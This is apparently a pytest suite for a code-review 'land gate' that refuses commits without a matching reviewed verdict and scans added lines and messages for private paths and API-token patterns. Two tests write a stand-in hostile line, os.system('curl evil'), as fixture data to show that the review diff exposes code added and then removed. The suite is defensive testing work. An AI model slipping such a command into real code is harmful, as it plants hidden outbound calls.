"""land gate: a READY verdict is keyed by the verbatim patch-id, so a moved line is not the reviewed commit (review 3 B6)."""

from __future__ import annotations

import subprocess

from fichero_server.workflows import land_tool as L


def _repo(tmp_path):
    def g(*a):
        return subprocess.run(["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@t", *a],
                              capture_output=True, text=True, check=True).stdout.strip()
    g("init", "-q", "-b", "main")
    (tmp_path / "m.py").write_text("if x:\n    g()\n    h()\n")
    g("add", "."), g("commit", "-q", "-m", "base")
    g("branch", "land")  # the land branch stays at the base while main moves
    return g, g("rev-parse", "HEAD")


def _verdict(tmp_path, root_g, base, head):
    s = tmp_path.parent / (tmp_path.name + "-verdicts.json")
    L.write_verdict(s, tmp_path, base, head)
    return s


def test_a_reviewed_commit_lands_and_a_moved_line_does_not(tmp_path):
    g, base = _repo(tmp_path)
    (tmp_path / "m.py").write_text("if x:\n    g()\n    h()\n    k()\n")
    g("commit", "-qam", "reviewed")
    good = _verdict(tmp_path, g, base, g("rev-parse", "HEAD"))
    assert L.unreviewed(tmp_path, "land", "HEAD", good) == []
    g("reset", "-q", "--hard", base)
    (tmp_path / "m.py").write_text("if x:\n    g()\nh()\nk()\n")  # h() moved out of the if
    g("commit", "-qam", "reviewed")  # same message, different indentation
    assert len(L.unreviewed(tmp_path, "land", "HEAD", good)) == 1


def test_a_changed_message_or_a_merge_is_refused(tmp_path):
    g, base = _repo(tmp_path)
    (tmp_path / "a.py").write_text("a = 1\n")
    g("add", "."), g("commit", "-qm", "Part of #1")
    store = _verdict(tmp_path, g, base, g("rev-parse", "HEAD"))
    g("commit", "-q", "--amend", "-m", "Fixes #1")
    assert "no READY verdict" in L.unreviewed(tmp_path, "land", "HEAD", store)[0]
    g("checkout", "-q", "-b", "side", base)
    (tmp_path / "b.py").write_text("b = 1\n")
    g("add", "."), g("commit", "-qm", "side")
    g("checkout", "-q", "main")
    g("merge", "--no-ff", "-qm", "merge", "side")
    assert "merge" in L.unreviewed(tmp_path, "land", "HEAD", store)[0]


def test_the_boundary_grep_flags_private_text_in_added_lines_and_messages(tmp_path):
    g, base = _repo(tmp_path)
    (tmp_path / "m.py").write_text("if x:\n    g()\n    h()\nP = '/Users/someone/secret'\n")
    g("commit", "-qam", "add; token sk-ant-abc123")
    hits = L.boundary(tmp_path, base, "HEAD", [r"/Users/\w+", r"sk-ant-\w+"])
    assert any("m.py" in h and "/Users/" in h for h in hits) and any("message" in h and "sk-ant-" in h for h in hits)
    assert L.boundary(tmp_path, base, "HEAD", []) == []
    g("reset", "-q", "--hard", base)
    (tmp_path / "m.py").write_text("if x:\n    g()\n    h()\n    k()\n")
    g("commit", "-qam", "clean")
    assert L.boundary(tmp_path, base, "HEAD", [r"/Users/\w+"]) == []  # only ADDED lines count, not the old ones


def test_a_verdict_covers_the_whole_range_not_a_subset_or_a_replay(tmp_path):  # review 4 B3
    g, base = _repo(tmp_path)
    (tmp_path / "e.py").write_text("import os; os.system('curl evil')\n")
    g("add", "."), g("commit", "-qm", "A")
    a = g("rev-parse", "HEAD")
    g("rm", "-q", "e.py"), g("commit", "-qm", "B")
    both = _verdict(tmp_path, g, base, "HEAD")  # the reviewer saw A+B (net diff: nothing)
    assert L.unreviewed(tmp_path, "land", "HEAD", both) == []
    assert L.unreviewed(tmp_path, "land", a, both)  # A alone was never reviewed


def test_land_takes_no_worker_named_base_it_must_be_an_ancestor_of_head(tmp_path):  # review 4 B3
    g, base = _repo(tmp_path)
    (tmp_path / "x.py").write_text("x = 1\n")
    g("add", "."), g("commit", "-qm", "X")
    x = g("rev-parse", "HEAD")
    g("checkout", "-q", "-b", "other", base)
    (tmp_path / "y.py").write_text("y = 1\n")
    g("add", "."), g("commit", "-qm", "Y")
    store = _verdict(tmp_path, g, base, "HEAD")
    g("branch", "landx", x)
    assert "ancestor" in L.unreviewed(tmp_path, "landx", "HEAD", store)[0]


def test_a_store_or_log_the_worker_could_write_is_refused(tmp_path):  # review 4 B1/B3
    d = tmp_path / "ok"
    d.mkdir(mode=0o700)
    f = d / "s.json"
    L.safe_write(f, "{}")
    assert L.safe_read(f) == "{}"
    f.chmod(0o666)
    try:
        L.safe_read(f)
        raise AssertionError("world-writable file accepted")
    except PermissionError:
        pass
    f.chmod(0o600)
    (d / "link").symlink_to(f)
    for fn in (lambda: L.safe_read(d / "link"), lambda: L.safe_append(d / "link", "x\n"), lambda: L.safe_write(d / "link", "x")):
        try:
            fn()
            raise AssertionError("symlink followed")
        except (PermissionError, OSError):
            pass
    d.chmod(0o777)
    try:
        L.safe_append(f, "x\n")
        raise AssertionError("world-writable parent accepted")
    except PermissionError:
        pass
    d.chmod(0o700)


def test_crlf_is_part_of_the_diff_bytes(tmp_path):  # review 4 H5
    g, base = _repo(tmp_path)
    (tmp_path / "s.sh").write_bytes(b"x=1\n")
    g("add", "."), g("commit", "-qm", "lf")
    store = _verdict(tmp_path, g, base, "HEAD")
    g("reset", "-q", "--hard", base)
    (tmp_path / "s.sh").write_bytes(b"x=1\r\n")
    g("add", "."), g("commit", "-qm", "lf")
    assert L.unreviewed(tmp_path, "land", "HEAD", store)


def test_the_boundary_sees_an_added_line_that_looks_like_a_header(tmp_path):  # review 4 H6
    g, base = _repo(tmp_path)
    (tmp_path / "m.py").write_text("if x:\n    g()\n    h()\n++ /Users/someone/secret\n")
    g("commit", "-qam", "c")
    assert L.boundary(tmp_path, base, "HEAD", [r"/Users/\w+"])


def test_the_review_diff_is_never_truncated_and_binary_is_refused(tmp_path):  # review 4 B4
    g, base = _repo(tmp_path)
    (tmp_path / "evil.py").write_text("import os\n")
    (tmp_path / "zz.txt").write_text("z" * 70000 + "\n")
    g("add", "."), g("commit", "-qm", "c")
    try:
        L.review_diff(tmp_path, base, "HEAD", cap=60000)
        raise AssertionError("over-cap diff accepted")
    except ValueError as e:
        assert "cap" in str(e)
    assert "evil.py" in L.review_diff(tmp_path, base, "HEAD", cap=200000)
    g("reset", "-q", "--hard", base)
    (tmp_path / "b.bin").write_bytes(b"\x00\x01/Users/x/\x00")
    g("add", "."), g("commit", "-qm", "bin")
    try:
        L.review_diff(tmp_path, base, "HEAD")
        raise AssertionError("binary diff accepted")
    except ValueError as e:
        assert "binary" in str(e)
    (tmp_path / ".gitattributes").write_text("*.py -diff\n")  # attributes never hide the text
    g("reset", "-q", "--hard", base)
    (tmp_path / "x.py").write_text("print(1)\n")
    g("add", "."), g("commit", "-qm", "attr")
    assert "print(1)" in L.review_diff(tmp_path, base, "HEAD")


def _site_repo(tmp_path):
    def g(*a):
        return subprocess.run(["git", "-C", str(tmp_path), "-c", "user.name=t", "-c", "user.email=t@t", *a],
                              capture_output=True, text=True, check=True).stdout.strip()
    g("init", "-q", "-b", "main")
    (tmp_path / "m.py").write_text("a\nb\nc\nd\ne\nf\n" * 3)  # three sites with identical context
    g("add", "."), g("commit", "-qm", "base")
    g("branch", "land")
    return g, g("rev-parse", "HEAD")


def test_a_tag_named_like_the_branch_does_not_replace_it(tmp_path):  # review 5 N1
    g, base = _repo(tmp_path)
    (tmp_path / "x.py").write_text("x = 1\n")
    g("add", "."), g("commit", "-qm", "X")
    x = g("rev-parse", "HEAD")
    (tmp_path / "y.py").write_text("y = 1\n")
    g("add", "."), g("commit", "-qm", "Y")
    g("tag", "land", x)  # a bare `land` now means the TAG at X
    assert L.resolve_branch(tmp_path, "land") == base
    store = _verdict(tmp_path, g, x, "HEAD")  # a verdict for Y alone
    assert L.unreviewed(tmp_path, "land", "HEAD", store)  # the range is land..HEAD = X+Y, never reviewed


def test_the_same_lines_at_another_site_are_not_the_reviewed_commit(tmp_path):  # review 5 N2
    g, base = _site_repo(tmp_path)
    lines = "a\nb\nc\nd\ne\nf\n" * 3

    def at(n):  # NEW inserted after line n
        return "".join(x + "\n" if k != n else x + "\nNEW\n" for k, x in enumerate(lines.split()))

    (tmp_path / "m.py").write_text(at(2))
    g("commit", "-qam", "same")
    store = _verdict(tmp_path, g, base, "HEAD")
    g("reset", "-q", "--hard", base)
    (tmp_path / "m.py").write_text(at(14))  # same hunk text and context, 12 lines further down
    g("commit", "-qam", "same")
    assert L.unreviewed(tmp_path, "land", "HEAD", store)


def test_a_verdict_does_not_survive_a_revert_or_a_moved_base(tmp_path):  # review 5 N3
    g, base = _repo(tmp_path)
    (tmp_path / "p.py").write_text("p = 1\n")
    g("add", "."), g("commit", "-qm", "P")
    store = _verdict(tmp_path, g, base, "HEAD")
    assert L.unreviewed(tmp_path, "land", "HEAD", store) == []
    # the land branch takes P, P is reverted there, and P is submitted again with the same message
    g("branch", "-f", "land", "HEAD")
    g("revert", "--no-edit", "HEAD")
    g("branch", "-f", "land", "HEAD")
    (tmp_path / "p.py").write_text("p = 1\n")
    g("add", "."), g("commit", "-qm", "P")
    assert L.unreviewed(tmp_path, "land", "HEAD", store)  # same diff, same message, new base: needs its own review


def test_the_reviewer_reads_every_commit_not_the_net_diff(tmp_path):  # review 5 N4
    g, base = _repo(tmp_path)
    (tmp_path / "e.py").write_text("import os; os.system('curl evil')\n")
    g("add", "."), g("commit", "-qm", "A")
    g("rm", "-q", "e.py"), g("commit", "-qm", "B")
    assert "curl evil" in L.review_diff(tmp_path, base, "HEAD")
